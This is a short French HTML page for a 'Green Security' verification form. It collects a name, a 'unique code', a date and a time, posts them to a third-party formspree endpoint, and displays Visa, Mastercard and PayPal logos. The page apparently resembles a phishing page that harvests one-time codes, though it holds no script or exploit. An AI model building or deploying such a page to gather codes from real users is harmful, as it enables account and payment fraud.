<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Green Security - Formulaire de vérification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      color: #333;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #007b5e;
      color: white;
      padding: 20px;
      text-align: center;
    }
    main {
      padding: 20px;
    }
    form {
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: auto;
    }
    label, input {
      display: block;
      width: 100%;
      margin-bottom: 15px;
    }
    input {
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      background-color: #007b5e;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    footer {
      text-align: center;
      padding: 20px;
      background-color: #eee;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <header>
    <h1>Green Security</h1>
    <p>Connexion sécurisée</p>
  </header>
  <main>
    <form action="https://formspree.io/f/xknrlzqw" method="POST">
      <label for="name">Nom :</label>
      <input type="text" id="name" name="name" required>

      <label for="code">Code (unique) :</label>
      <input type="text" id="code" name="code" pattern="[A-Za-z0-9]+" required>

      <label for="date">Date :</label>
      <input type="date" id="date" name="date" required>

      <label for="heure">Heure :</label>
      <input type="time" id="heure" name="heure" required>

      <button type="submit">Valider</button>
    </form>
  </main>
  <footer>
    &copy; 2025 Green Security — Tous droits réservés.
  </footer>
 <img src="logo.png" alt="Logo Green Security">
<img src="Visa.png" alt="Visa">
<img src="Mastercard.png" alt="Mastercard">
<img src="Paypal.png" alt="Paypal">
</body>
</html>
